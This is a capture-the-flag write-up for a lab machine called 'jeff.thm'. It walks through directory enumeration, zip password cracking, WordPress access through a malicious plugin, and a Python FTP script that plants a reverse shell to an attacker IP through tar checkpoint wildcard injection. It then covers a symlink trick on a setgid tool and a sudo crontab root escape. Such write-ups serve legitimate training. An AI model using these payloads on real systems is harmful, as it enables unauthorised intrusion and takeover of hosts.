# Enumeration

Nmap scans reveal ports 22 and 80 are open.

![4bd4e21a930e71ac9a42d6083e0fb421.png](./_resources/4bd4e21a930e71ac9a42d6083e0fb421.png)

![84623b57a4badfe69ca656717ff2dc84.png](./_resources/84623b57a4badfe69ca656717ff2dc84.png)

Investigating the source code of the web server suggests adding `jeff.thm` to the `/etc/hosts` file.

![04fb1cf3534b2f0dff0d743f390861ab.png](./_resources/04fb1cf3534b2f0dff0d743f390861ab.png)

Let's use gobuster to look for interesting directories.

![0e9035b5906bf264951fb9573f2e8f5f.png](./_resources/0e9035b5906bf264951fb9573f2e8f5f.png)

The uploads directory seems promising, but doesn't lead anywhere. Enumerating further with gobuster, we eventually find a `/backups/backup.zip` file. We cannot unzip the file as it is password protected. Use `zip2john backup.zip > backup.txt` together with john to find the password:

![07ad40f238ffbd58086fcf9df66ab5ae.png](./_resources/07ad40f238ffbd58086fcf9df66ab5ae.png)

Now we unzip the file to reveal a `wordpress.bak` file, which contains a password.

![c98932bf70fa810a790673f97afbe4c7.png](./_resources/c98932bf70fa810a790673f97afbe4c7.png)

WordPress didn't show show during our gobuster directory scans, so this suggests it may appear via a subdomain. Indeed, we can just guess by adding `wordpress.jeff.thm` to the `/etc/hosts` file and navigating there. Alternatively, we can also use gobuster to enumerate subdomains.

```bash
gobuster vhost -u http://jeff.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
```

![19618e16f0d1451f63703a11fc62cf22.png](./_resources/19618e16f0d1451f63703a11fc62cf22.png)

As expected, the `wordpress.jeff.thm` subdomain leads to a WordPress page. Navigating to the login page, we verify that Jeff is a valid login name.

![293c19863a205868a685ae7c71dc3d73.png](./_resources/293c19863a205868a685ae7c71dc3d73.png)

![daa38b5d9d63bee7f89f8cdeb9365807.png](./_resources/daa38b5d9d63bee7f89f8cdeb9365807.png)

Logging in with the password we found earlier gives us access to jeff's WordPress account.

![64b57eca6d901711ffbfa44ec51276c9.png](./_resources/64b57eca6d901711ffbfa44ec51276c9.png)

<br>

# Exploitation

The usual techniques (e.g. changing 404.php to a reverse shell script) doesn't seem to work. Instead, we will use a [malicious WordPress plugin](https://github.com/wetw0rk/malicious-wordpress-plugin). Download the python script and run it to generate a malicious zip file.

![d39573755e4ac8e16e74f89b7ebcb97e.png](./_resources/d39573755e4ac8e16e74f89b7ebcb97e.png)

The python script will also launch Metasploit in order to set up a handler. Navigate to the plugin page, click "Add New" and upload the zip file.

![cd7edf8c237ed0dd8fcf33112ac60f1d.png](./_resources/cd7edf8c237ed0dd8fcf33112ac60f1d.png)

Activate the plugin and navigate to `wordpress.jeff.thm/wp-content/plugins/malicious/wetw0rk_maybe.php`. The meterpreter handler will catch the reverse shell as the `www-data` user.

![4707c8682bda597391d4728fea0f9ae9.png](./_resources/4707c8682bda597391d4728fea0f9ae9.png)

Looking around, we find a `ftp_backup.php` file containing credentials for an ftp server in a container.

![658753e04dc6d99eb6628e8035831b37.png](./_resources/658753e04dc6d99eb6628e8035831b37.png)

To access the ftp server, we use the following python script which will give us code execution on the ftp server. (To be completely transparent, I found this thanks to Google.)

```python
#!/usr/bin/env python3.7 
 
from ftplib import FTP
import io 
import os
import fileinput
 
host = "172.20.0.1"
username = "backupmgr"
password = "<password from ftp_backup.php>"
 
ftp = FTP(host=host)
 
login_status = ftp.login(user=username, passwd=password)
print(login_status)
ftp.set_pasv(False)
ftp.cwd('files')
print(ftp.dir())
 
rev = io.BytesIO(b'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker IP>",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
emptyFile = io.BytesIO(b'')
ftp.storlines('STOR rev.sh', rev)
ftp.storlines('STOR --checkpoint=1', emptyFile)
ftp.storlines('STOR --checkpoint-action=exec=sh rev.sh', emptyFile)
ftp.dir()
```

Set up a netcat listener on the local machine. Transfer the script to the target machine and run it. This will give us a shell as the backupmgr user.

![28383174a10bbfc79578ec0ecaa623ce.png](./_resources/28383174a10bbfc79578ec0ecaa623ce.png)

Note that we are still in the container, so we need to escape. We know that Jeff is a user, so we can look for files owned by Jeff using `find / -user jeff 2>/dev/null`.

![6feeb53bbca7d81fe59fcf22ec381396.png](./_resources/6feeb53bbca7d81fe59fcf22ec381396.png)

The `jeff.bak` file looks appealing, but unfortunately we can't access it. Navigating to the `/opt/systools` directory, we find a message for Jeff.

![c3dcd148e44db12776b895e116a80563.png](./_resources/c3dcd148e44db12776b895e116a80563.png)

Note that the `systool` file is executable and has the GUID bit set. Running it gives us an option to restore a password. If we click this option, we observe that it prints the text contained in the `message.txt` file.

![63b56adc181f0c2da18f21774d4021e8.png](./_resources/63b56adc181f0c2da18f21774d4021e8.png)

Let's take advantage of this by essentially replacing the `message.txt` output with the contents from the `jeff.bak` file. Remove the `message.txt` file from the directory. Now use `ln -s /var/backups/jeff.bak message.txt` to link the backup file to the non-existent `message.txt`. This way, when the systool script calls for the `message.txt` file, it will print the contents of the backup file.

![a9b9b257232b1fc62bdd8aa02d938c10.png](./_resources/a9b9b257232b1fc62bdd8aa02d938c10.png)

We now have Jeff's ssh credentials. If we `su` in Jeff's account, we note that we are in a restricted bash shell since the `cd` command is not permitted. To fix this, we can upgrade our shell in the usual way by using `python -c 'import pty;pty.spawn("/bin/bash")'`.

Now we can `cd` into jeff's home directory, where we find the `user.txt` flag.

![96f26d98032ecea2ffc969cb7557eee0.png](./_resources/96f26d98032ecea2ffc969cb7557eee0.png)

The flag tells us to hash the output. For this, we can run `echo -n <flag contents> | md5sum` to obtain the actual flag. (Here, it looks like we have to guess the hash format.)

<br>

# Post-Exploitation

Using `sudo -l`, we see that Jeff can run crontab as root.

![85e201cff563932df780f691094b08a8.png](./_resources/85e201cff563932df780f691094b08a8.png)

Navigating to [GTFOBins](https://gtfobins.github.io/gtfobins/crontab/), we see that we can use this for privesc. Run `sudo /usr/bin/crontab -e` to open crontab, which runs in vim. Now type `:!/bin/bash` and press enter to spawn a bash shell as root.

![6b710ee78ccca46cd960e3641a17071f.png](./_resources/6b710ee78ccca46cd960e3641a17071f.png)

Success! From here, we can easily find the `root.txt` flag.

![65001919099d20fd36fd25e6a3eb7d54.png](./_resources/65001919099d20fd36fd25e6a3eb7d54.png)